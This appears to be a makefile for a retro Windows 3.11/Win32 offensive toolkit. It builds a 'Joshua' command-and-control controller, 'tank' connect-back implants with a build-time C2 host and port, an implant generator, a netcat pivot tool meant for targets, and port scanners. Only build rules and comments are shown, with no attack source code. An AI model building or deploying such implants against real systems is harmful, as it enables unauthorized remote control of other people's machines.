# =================================================================
# ncwfw.exe — MDI Netcat (plain TCP + optional Schannel TLS)
# Standalone: no PuTTY objects needed.
# TLS requires secur32.dll (NT 4.0 SP3+ / Win95 OSR2+), loaded at runtime.
# Plain TCP works on Win32s / Windows 3.1.
# =================================================================

ncwfw.obj: ncwfw.c
	$(CC) $(COMPAT) $(CFLAGS) $(XFLAGS) -fo=$@ -c ncwfw.c

ncwfw.res: ncwfw.rc ncwfw.ico
	$(RCPATH) $(RCFLAGS) ncwfw.rc -o ncwfw.res

ncwfw.exe: ncwfw.obj ncwfw.res
	$(CC) -bt=nt -l=nt_win -fe=$@ $(LDFLAGS) ncwfw.obj wsock32.lib
	wrc ncwfw.res $@

# =================================================================
# joshua.exe -- Joshua C2 controller (MDI, listens for Tank callbacks)
# =================================================================

joshua.obj: joshua.c
	$(CC) $(COMPAT) $(CFLAGS) $(XFLAGS) -fo=$@ -c joshua.c

joshua.res: joshua.rc joshua.ico
	$(RCPATH) $(RCFLAGS) joshua.rc -o joshua.res

joshua.exe: joshua.obj joshua.res
	$(CC) -bt=nt -l=nt_win -fe=$@ $(LDFLAGS) joshua.obj wsock32.lib
	wrc joshua.res $@

# =================================================================
# tank.exe -- Tank Program v1 (connect-back implant)
# Override host/port at build time:
#   wmake -f Makefile.wc XFLAGS="-DTANK_C2_HOST=\"1.2.3.4\" -DTANK_C2_PORT=443"
# =================================================================

tank.obj: tank.c
	$(CC) $(COMPAT) $(CFLAGS) $(XFLAGS) -fo=$@ -c tank.c

recognizer.obj: recognizer.c
	$(CC) $(COMPAT) $(CFLAGS) $(XFLAGS) -fo=$@ -c recognizer.c

tank.res: tank.rc tank.ico
	$(RCPATH) $(RCFLAGS) tank.rc -o tank.res

tank.exe: tank.obj recognizer.obj tank.res
	$(CC) -bt=nt -l=nt_win -fe=$@ $(LDFLAGS) tank.obj recognizer.obj wsock32.lib
	wrc tank.res $@

# =================================================================
# tank16.exe -- Win16 connect-back implant (WFW 3.11, no Win32s)
# Requires OpenWatcom wcc (16-bit) and wlink, plus Win16 winsock.lib.
# Override host/port:
#   wmake -f Makefile.wc tank16.exe XFLAGS="-DTANK_C2_HOST=\"x.x.x.x\" -DTANK_C2_PORT=443"
# =================================================================

tank16.obj: tank16.c
	wcc -ml -bt=windows -zu -s -I/opt/watcom/h/win $(XFLAGS) -fo=$@ tank16.c

tank16.res: tank.rc tank.ico
	wrc -q -bt=windows -r -fo=$@ tank.rc

tank16.exe: tank16.obj tank16.res
	wlink system windows name $@ file tank16.obj library winsock.lib
	wrc tank16.res $@

# lman16.exe -- Lightman Win16 CLI operator client (WFW 3.11 DOS Prompt)
lman16.obj: lman16.c
	wcc -ml -bt=windows -zu -s -I/opt/watcom/h/win $(XFLAGS) -fo=$@ lman16.c

lman16.exe: lman16.obj
	wlink system windows name $@ file lman16.obj library winsock.lib

# nc16.exe -- Win16 netcat pivot tool (WFW 3.11, deployed on target)
nc16.obj: nc16.c
	wcc -ml -bt=windows -zu -s -I/opt/watcom/h/win $(XFLAGS) -fo=$@ nc16.c

nc16.exe: nc16.obj
	wlink system windows name $@ file nc16.obj library winsock.lib

# =================================================================
# clu.exe -- CLU implant generator (Win32, patches tank.exe / tank16.exe)
# =================================================================

clu.obj: clu.c
	$(CC) $(COMPAT) $(CFLAGS) $(XFLAGS) -fo=$@ -c clu.c

clu.res: clu.rc lightcycle.ico
	$(RCPATH) $(RCFLAGS) clu.rc -o clu.res

clu.exe: clu.obj clu.res
	$(CC) -bt=nt -l=nt_win -fe=$@ $(LDFLAGS) clu.obj comdlg32.lib
	wrc clu.res $@

# =================================================================
# grid.exe -- Win32 console port scanner (TCP connect, TUI / parseable)
# Console subsystem (-l=nt), no GUI objects needed.
# Data: SERVICES.DAT next to grid.exe or %GRIDDATA%\SERVICES.DAT
# =================================================================

grid.obj: grid.c
	$(CC) $(COMPAT) $(CFLAGS) $(XFLAGS) -fo=$@ -c grid.c

grid.res: grid.rc grid.ico
	$(RCPATH) $(RCFLAGS) grid.rc -o grid.res

grid.exe: grid.obj grid.res
	$(CC) -bt=nt -l=nt_win -fe=$@ $(LDFLAGS) grid.obj wsock32.lib comdlg32.lib
	wrc grid.res $@

# gridcli.exe -- console port scanner (.exe rule with icon is in NT-tools section)
gridcli.obj: gridcli.c
	$(CC) $(COMPAT) $(CFLAGS) $(XFLAGS) -fo=$@ -c gridcli.c

# grid16.exe -- Win16 console port scanner (WFW 3.11 COMMAND.COM)
grid16.obj: grid16.c
	wcc -ml -bt=windows -zu -s -I/opt/watcom/h/win $(XFLAGS) -fo=$@ grid16.c

grid16.exe: grid16.obj
	wlink system windows name $@ file grid16.obj library winsock.lib

# grid32.exe -- Win32 console scanner (Win95 + NT, deployable on target)
grid32.obj: grid32.c
	$(CTOOL_CC) -c $(XFLAGS) -fo=$@ grid32.c

grid32.exe: grid32.obj
	$(CTOOL_CC) $(NT_STUB) -fe=$@ $(LDFLAGS) grid32.obj wsock32.lib

# gridnt.exe -- NT-specific console scanner (operator workstation, coloured output)
gridnt.obj: gridnt.c
	$(CTOOL_CC) -c $(XFLAGS) -fo=$@ gridnt.c

gridnt.exe: gridnt.obj ntstub.exe
	$(CTOOL_CC) $(NT_STUB) -fe=$@ $(LDFLAGS) gridnt.obj wsock32.lib

